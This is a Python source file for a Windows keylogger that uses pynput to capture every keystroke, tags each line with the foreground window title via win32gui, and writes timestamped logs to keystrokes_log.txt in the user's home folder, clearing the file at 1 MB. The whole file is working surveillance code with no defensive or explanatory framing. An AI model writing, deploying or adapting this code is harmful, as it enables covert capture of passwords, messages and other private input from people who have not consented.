from pynput import keyboard
import time
import os
import win32gui

log_dir = os.path.expanduser('~')
log_file = os.path.join(log_dir, 'keystrokes_log.txt')
current_word = ""
current_line = ""
current_window = ""

def get_active_window_title():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

def on_key_press(key):
    global current_word, current_line, current_window

    try:
        if hasattr(key, 'char'):
            current_word += key.char
        elif key == keyboard.Key.space:
            save_current_word()
            current_word += ' '
        elif key == keyboard.Key.enter:
            save_current_word()
            current_word += ' [ENTER] '
    except AttributeError:
        pass

    current_window = get_active_window_title()

    if len(current_line) >= 50:  # Adjust the threshold as needed
        save_current_line()

def save_current_word():
    global current_word, current_line, current_window

    if current_word:
        current_line += current_word
        current_word = ""

def save_current_line():
    global current_line, current_window

    if current_line:
        try:
            with open(log_file, 'a') as f:
                f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - [{current_window}] {current_line}\n')
            current_line = ""
            clear_log_file_if_needed()
        except Exception as e:
            print("Error writing to file:", e)

def clear_log_file_if_needed():
    try:
        file_size = os.path.getsize(log_file)
        if file_size >= 1000000:  # 1 MB
            open(log_file, 'w').close()  # Clear the log file
    except Exception as e:
        print("Error clearing log file:", e)

def main():
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == '__main__':
    main()
